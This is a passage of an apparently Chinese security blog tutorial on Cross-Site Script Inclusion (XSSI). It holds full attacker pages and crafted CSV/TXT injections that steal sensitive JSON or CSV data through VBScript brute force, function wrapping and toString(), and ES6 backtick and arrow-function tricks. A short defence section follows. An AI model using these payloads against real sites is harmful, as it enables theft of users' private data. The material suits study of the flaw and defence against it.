class="string">"admin"</span>,<span class="string">"password"</span>]: MsgBox <span class="string">"value=password"</span>: End Sub</span></span><br><span class="line"><span class="actionscript">	Sub [<span class="string">"admin"</span>,<span class="string">"123456"</span>]: MsgBox <span class="string">"value=123456"</span>: End Sub</span></span><br><span class="line"><span class="actionscript">	Sub [<span class="string">"admin"</span>,<span class="string">"admin"</span>]: MsgBox <span class="string">"value=admin"</span>: End Sub</span></span><br><span class="line"><span class="actionscript">	Sub [<span class="string">"admin"</span>,<span class="string">"this_is_password"</span>]: MsgBox <span class="string">"value=this_is_password"</span>: End Sub</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target JSON as VBScript --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.json"</span> <span class="attr">language</span>=<span class="string">"vbscript"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在IE 8中成功利用VBScript穷举出JSON数组中的敏感信息：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/15.png" alt=""></p>
+<h4 id="利用敏感文件中的可控字段窃取数据"><a href="#利用敏感文件中的可控字段窃取数据" class="headerlink" title="利用敏感文件中的可控字段窃取数据"></a>利用敏感文件中的可控字段窃取数据</h4><h5 id="CSV-with-quotations-thef"><a href="#CSV-with-quotations-thef" class="headerlink" title="CSV with quotations thef"></a>CSV with quotations thef</h5><p>简单地说，就是CSV文件中的敏感内容被双引号括起来了，这样的话前面针对CSV的操作就没用了。但是如果我们能够控制CSV文件中某些项的值，那么还是可以进行信息窃取的，而且一般我们进行CSV文件导出之前、我们是可以设置我们想导出的项以及内容的。</p>
+<p>注意，该方法目前仅适用于全版本的IE，不适用于Chrome和Firefox。</p>
+<p>假设CSV文件如下，其中有两处地方可控：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1,&quot;可控&quot;,&quot;123@123.com&quot;,&quot;03-0000-0001&quot;</span><br><span class="line">2,&quot;admin&quot;,&quot;456@456.com&quot;,&quot;03-0000-0002&quot;</span><br><span class="line">3,&quot;guest&quot;,&quot;789@789.com&quot;,&quot;03-0000-0003&quot;</span><br><span class="line">4,&quot;tester&quot;,&quot;abc@abc.com&quot;,&quot;03-0000-0004&quot;</span><br><span class="line">5,&quot;可控&quot;,&quot;def@def.com&quot;,&quot;03-0000-0005&quot;</span><br></pre></td></tr></table></figure>
+<p>此时，我们可以通过可控的项来构造如下的CSV文件，先注入个双引号闭合掉前面的引号，然后使用<code>mi1k7ea=function() {/*…*/}</code>来解决多行的问题：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1,&quot;a&quot;,mi1k7ea=function()&#123;/*&quot;,&quot;123@123.com&quot;,&quot;03-0000-0001&quot;</span><br><span class="line">2,&quot;admin&quot;,&quot;456@456.com&quot;,&quot;03-0000-0002&quot;</span><br><span class="line">3,&quot;guest&quot;,&quot;789@789.com&quot;,&quot;03-0000-0003&quot;</span><br><span class="line">4,&quot;tester&quot;,&quot;abc@abc.com&quot;,&quot;03-0000-0004&quot;</span><br><span class="line">5,&quot;*/&#125;//&quot;,&quot;def@def.com&quot;,&quot;03-0000-0005&quot;</span><br></pre></td></tr></table></figure>
+<p>xssi.html，调用mi1k7ea.toString()获取函数源码来达到攻击目标数据的目的：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">	alert(mi1k7ea.toString());</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在IE 11中测试成功：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/25.png" alt=""></p>
+<p>为啥能成功执行？我们将CSV文件内容直接放到IE的Console中运行，浏览器是能够成功识别为JS代码并定义了一个名为mi1k7ea的JS函数：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/26.png" alt=""></p>
+<p>也就是说，<strong>通过可控字段构造CSV文件的目的就是为了让文件内容使浏览器能够正常识别为JS代码，并且将中间的敏感信息都注释掉，然后通过调用toString()函数来获取JS函数源码从而成功窃取敏感信息。</strong></p>
+<p>其实前面那段CSV内容放到Chrome和Firefox中都能成功识别为JS的，结果和IE的一样，但为啥不能在XSSI中利用呢？——原因在于目前较新版本的Chrome和Firefox都已经将MIME类型为<code>text/csv</code>的响应都自动拦截掉了，因此无法成功利用：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/27.png" alt=""></p>
+<h5 id="利用ECMAScript6特性——‘-’反引号"><a href="#利用ECMAScript6特性——‘-’反引号" class="headerlink" title="利用ECMAScript6特性——‘`’反引号"></a>利用ECMAScript6特性——‘`’反引号</h5><p>业界研究的这种技巧，是针对Chrome和Firefox的利用的，因为，但是在目前的Chrome和Firefox中已经不再能成功利用，原因如前面所说，Chrome和Firefox都已经将MIME类型为<code>text/csv</code>的响应都自动拦截掉了。</p>
+<p>但是我们还是来看下这个原理和利用吧。</p>
+<p>假设目标CSV文件如下，其中’Sample report’这个字段是我们可以控制的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br></pre></td></tr></table></figure>
+<p> 然后我们构造如下，将’Sample’作为JS变量，变量内容未反引号括起来的内容，最后需要注释掉后面部分的内容才能使浏览器识别JS不会报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status</span><br><span class="line">1234,Sample=` report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample`// report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br></pre></td></tr></table></figure>
+<p>xssi.html，注意定义CSV中第一行的项为变量：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">	alert(Sample.toString());</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在Chrome或Firefox上测试是不成功的，原因同上：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/29.png" alt=""></p>
+<p>但是这段CSV在Firefox和Chrome上的Console上是能成功识别并执行的，也就是说构造本身是没问题的：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/32.png" alt=""></p>
+<h5 id="利用ECMAScript6特性——箭头函数"><a href="#利用ECMAScript6特性——箭头函数" class="headerlink" title="利用ECMAScript6特性——箭头函数"></a>利用ECMAScript6特性——箭头函数</h5><p>a.csv，假设num和b项可控：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name,num,team</span><br><span class="line">Jordan,23,Bull</span><br><span class="line">Kobe,24,Laker</span><br><span class="line">James,23,Laker</span><br><span class="line">Iversion,3,76er</span><br><span class="line">a,b,c</span><br></pre></td></tr></table></figure>
+<p>构造如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name,num=i=&gt;/*,team</span><br><span class="line">Jordan,23,Bull</span><br><span class="line">Kobe,24,Laker</span><br><span class="line">James,23,Laker</span><br><span class="line">Iversion,3,76er</span><br><span class="line">a,b*/i//,c</span><br></pre></td></tr></table></figure>
+<p>xssi.html：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">	alert(num.toString());</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在Chrome和Firefox上运行会报错，原因同上。</p>
+<p>但是这段CSV在Firefox和Chrome上的Console上是能成功识别并执行的，也就是说构造本身是没问题的：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/33.png" alt=""></p>
+<h5 id="窃取非JS、非CSV类型文件敏感信息"><a href="#窃取非JS、非CSV类型文件敏感信息" class="headerlink" title="窃取非JS、非CSV类型文件敏感信息"></a>窃取非JS、非CSV类型文件敏感信息</h5><p>前面三种方法，对于现在较新版本的Chrome和Firefox都是失效，但是如果目标文件类型并非是JS/CSV的话，就能够通过可控字段来构造文件内容实现在Chrome和Firefox上的执行，这是因为响应的MIME类型并非<code>text/csv</code>，也就不会被浏览器所拦截了。</p>
+<p>比如前面的三种方法中，将a.csv改为a.txt，在Chrome和Firefox上能成功执行：</p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/28.png" alt=""></p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/30.png" alt=""></p>
+<p><img src="/2020/01/04/浅析XSSI漏洞/31.png" alt=""></p>
+<p>在前面的第二种方法中，还有一种构造形式，即将Sample后面的=等号去掉，也就是说直接将Sample当成函数进行定义，a.txt如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status</span><br><span class="line">1234,Sample` report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br><span class="line">1234,Sample`// report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed</span><br></pre></td></tr></table></figure>
+<p>xssi.html修改如下，直接获取Sample函数的参数内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="keyword">var</span> report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="function"><span class="keyword">function</span> <span class="title">Sample</span><span class="params">(strings)</span></span>&#123;</span></span><br><span class="line"><span class="undefined">		alert(strings);</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.txt"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样同样能利用成功。</p>
+<p>参照这些例子，同理去挖掘即可。</p>
+<h3 id="网上的案例"><a href="#网上的案例" class="headerlink" title="网上的案例"></a>网上的案例</h3><p>Yahoo的XSSI，窃取动态JS文件中的session值，进而窃取受害者账号的具体信息：<a href="https://www.freebuf.com/articles/web/179851.html" target="_blank" rel="noopener">挖洞经验 | 看我如何发现雅虎XSSi漏洞实现用户信息窃取</a></p>
+<p>Hackerone的XSSI，CSV文件内容的窃取以及非JS非CSV类型文件内容的窃取：<a href="https://www.anquanke.com/post/id/86173" target="_blank" rel="noopener">【技术分享】hackerone漏洞：如何利用XSSI窃取多行字符串（含演示视频）</a></p>
+<p><a href="https://v.youku.com/v_show/id_XMjc4NjEwNTczMg==.html?refer=seo_operation.liuxiao.liux_00003311_3000_QfMVj2_19042900" target="_blank" rel="noopener">演示视频</a></p>
+<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><ul>
+<li>开发者永远也不要把敏感数据放在JavaScript文件中， 也不要放在JSONP中；</li>
+<li>请求敏感文件/响应的尽量改为POST方式；</li>
+<li>使用类似于CSRF-Token机制；</li>
+<li>设置响应头为<code>X-Content-Type-Options: nosniff</code>，此时浏览器就会拒绝加载JS类型的数据；</li>
+</ul>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://vulncity.com/archives/14/" target="_blank" rel="noopener">使用XSSI攻击获取敏感信息</a></p>
+<p><a href="http://drops.wooyun.org/papers/5797" target="_blank" rel="noopener">XSSI攻击利用 – 大学生</a></p>
+<p><a href="https://www.freebuf.com/articles/web/87374.html" target="_blank" rel="noopener">揭开XSSI攻击的神秘面纱</a></p>
+<p><a href="https://www.anquanke.com/post/id/85337" target="_blank" rel="noopener">【技术分享】XSSI： 一个不出名但是影响广泛的Web漏洞</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-背景"><span class="toc-text">0x00 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-XSSI原理"><span class="toc-text">0x01 XSSI原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-XSSI与XSS、CSRF的区别"><span class="toc-text">0x02 XSSI与XSS、CSRF的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-XSSI攻击利用"><span class="toc-text">0x03 XSSI攻击利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#针对JavaScript类型文件"><span class="toc-text">针对JavaScript类型文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#窃取JS全局变量的值"><span class="toc-text">窃取JS全局变量的值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#重写函数窃取数据"><span class="toc-text">重写函数窃取数据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Demo1"><span class="toc-text">Demo1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Demo2"><span class="toc-text">Demo2</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#重写原型链窃取数据"><span class="toc-text">重写原型链窃取数据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Demo1-1"><span class="toc-text">Demo1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#原型链分析"><span class="toc-text">原型链分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Demo2-1"><span class="toc-text">Demo2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#针对非JavaScript类型文件"><span class="toc-text">针对非JavaScript类型文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IE-bug导致错误信息泄漏"><span class="toc-text">IE bug导致错误信息泄漏</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UTF-16编码窃取敏感信息"><span class="toc-text">UTF-16编码窃取敏感信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Harmony-proxy-bug-in-Firefox-Chrome"><span class="toc-text">Harmony proxy bug in Firefox / Chrome</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#穷举搜索"><span class="toc-text">穷举搜索</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#定义变量穷举CSV内容"><span class="toc-text">定义变量穷举CSV内容</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JS-getter穷举CSV内容"><span class="toc-text">JS getter穷举CSV内容</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#结合VBScript穷举JSON数组"><span class="toc-text">结合VBScript穷举JSON数组</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用敏感文件中的可控字段窃取数据"><span class="toc-text">利用敏感文件中的可控字段窃取数据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CSV-with-quotations-thef"><span class="toc-text">CSV with quotations thef</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用ECMAScript6特性——‘-’反引号"><span class="toc-text">利用ECMAScript6特性——‘`’反引号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用ECMAScript6特性——箭头函数"><span class="toc-text">利用ECMAScript6特性——箭头函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#窃取非JS、非CSV类型文件敏感信息"><span class="toc-text">窃取非JS、非CSV类型文件敏感信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网上的案例"><span class="toc-text">网上的案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-防御"><span class="toc-text">0x04 防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考"><span class="toc-text">0x05 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2020/01/01/浅析Influxdb认证绕过漏洞/" rel="next" title="浅析Influxdb认证绕过漏洞">
+          浅析Influxdb认证绕过漏洞
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2020/01/10/SpEL表达式注入漏洞总结/" rel="prev" title="SpEL表达式注入漏洞总结">
+            SpEL表达式注入漏洞总结
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
